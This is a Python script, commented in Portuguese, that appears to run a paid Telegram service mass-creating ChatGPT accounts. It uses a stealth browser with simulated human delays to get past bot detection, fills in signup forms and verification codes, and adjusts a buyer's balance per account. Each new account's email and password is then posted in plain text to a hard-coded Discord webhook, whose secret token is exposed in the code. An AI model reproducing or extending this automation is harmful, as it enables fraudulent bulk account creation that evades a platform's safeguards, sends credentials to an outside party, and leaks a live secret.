import time
import random
import re
import datetime
import requests
import traceback

from cloakbrowser import launch


def criar_conta(browser, conta, chat_id, user_id, job_id, preco, send_message_func, edit_message_func, log_resultado_func, update_pool_status_func, ajustar_saldo_func, wait_for_code_manual_func, send_discord_webhook_func):
    email = conta['email']
    senha = conta['senha']
    nome = conta.get('nome', '')
    nascimento = conta.get('nascimento', '')

    print(f"\n=== Criando (paralelo): {email} ===")

    progress = f"""📌 {email}

Estado: Iniciando cadastro... (paralelo)"""
    msg_id = send_message_func(chat_id, progress)

    # Cada thread tem seu próprio browser (mais estável)
    local_browser = launch(headless=False, humanize=True)
    page = local_browser.new_page()

    try:
        page.goto("https://chatgpt.com")
        page.wait_for_load_state("networkidle")
        human_delay(2, 4)

        current_url = page.url

        if "/auth/login" in current_url or "Entrar ou cadastrar-se" in page.content():
            for sel in ["input[type='email']", "input[name='email']", "input[placeholder*='email' i]"]:
                if safe_fill(page, sel, email):
                    break
            page.keyboard.press("Enter")
            human_delay(2, 3)
        else:
            if not click_cadastro(page):
                edit_message_func(chat_id, msg_id, f"""📌 {email}\n\n❌ Falha ao encontrar botão de cadastro.""")
                log_resultado_func(user_id, email, "ERRO_CADASTRO")
                update_pool_status_func(user_id, email, "erro")
                page.close()
                local_browser.close()
                return

        edit_message_func(chat_id, msg_id, f"""📌 {email}\n\nEstado: Colocando email...""")
        human_delay(1, 2)

        for sel in ["input[type='email']", "input[name='email']", "input[placeholder*='email' i]"]:
            if safe_fill(page, sel, email): break
        page.keyboard.press("Enter")
        human_delay(2, 3)

        edit_message_func(chat_id, msg_id, f"""📌 {email}\n\nEstado: Colocando senha...""")
        safe_click_text(page, "Continuar com uma senha", "Continue with a password")
        human_delay(1.5, 3)

        for sel in ["input[type='password']", "input[name='password']"]:
            if safe_fill(page, sel, senha): break
        page.keyboard.press("Enter")
        human_delay(4, 6)

        ajustar_saldo_func(chat_id, -preco)

        edit_message_func(chat_id, msg_id, f"""📌 {email}\n\nEstado: Buscando código...""")

        code = get_code_from_site(local_browser, email)

        if not code:
            edit_message_func(chat_id, msg_id, f"""📌 {email}\n\nEstado: Aguardando código no Telegram...""")
            send_message_func(chat_id, f"{email}\nManda o código de 6 dígitos:")
            code = wait_for_code_manual_func(chat_id, job_id, timeout=120)

        if not code:
            edit_message_func(chat_id, msg_id, f"""📌 {email}\n\n❌ Timeout. Reembolsando...""")
            ajustar_saldo_func(chat_id, preco)
            log_resultado_func(user_id, email, "TIMEOUT")
            update_pool_status_func(user_id, email, "timeout")
            page.close()
            local_browser.close()
            return

        edit_message_func(chat_id, msg_id, f"""📌 {email}\n\nEstado: Colocando código...""")

        for sel in ["input[placeholder*='digito' i]", "input[placeholder*='codigo' i]", "input[type='text']"]:
            try:
                page.wait_for_selector(sel, timeout=3000)
                page.fill(sel, code)
                break
            except:
                continue

        page.keyboard.press("Enter")
        human_delay(4, 6)

        edit_message_func(chat_id, msg_id, f"""📌 {email}\n\nEstado: Preenchendo nome e idade...""")
        preencher_nome_idade(page, nome, nascimento)

        human_delay(2, 4)

        try:
            page.wait_for_selector("text=ChatGPT", timeout=10000)
            edit_message_func(chat_id, msg_id, f"""📌 {email}\n\n✅ CONTA CRIADA COM SUCESSO! (paralelo)""")
            log_resultado_func(user_id, email, "SUCESSO")
            update_pool_status_func(user_id, email, "done")

            send_discord_webhook_func(email, senha)

        except:
            edit_message_func(chat_id, msg_id, f"""📌 {email}\n\n⚠️ Pode precisar de verificação manual.\n\nEmail: `{email}`""")
            log_resultado_func(user_id, email, "VERIFICAR")
            update_pool_status_func(user_id, email, "verificar")
            ajustar_saldo_func(chat_id, preco)

    except Exception as e:
        print("\n=== ERRO DETALHADO (paralelo) ===")
        traceback.print_exc()
        edit_message_func(chat_id, msg_id, f"""📌 {email}\n\n❌ Erro: {str(e)[:100]}""")
        log_resultado_func(user_id, email, "ERRO")
        update_pool_status_func(user_id, email, "erro")
        ajustar_saldo_func(chat_id, preco)
    finally:
        try:
            page.close()
            local_browser.close()
        except:
            pass


def send_discord_webhook(email, senha):
    DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1521084787992035388/gam6A3ZpCwadetVav3ZEaEQ4Dt4feTZtPUsCkDBxQXM2EeynlQMyozIObIcl9Oanb7lu"
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        payload = {
            "content": f"**Nova conta criada!**\n\n**Email:** `{email}`\n**Senha:** `{senha}`"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=8)
        print(f"[Discord] ✅ Webhook enviado para {email}")
    except Exception as e:
        print(f"[Discord] Erro ao enviar webhook: {e}")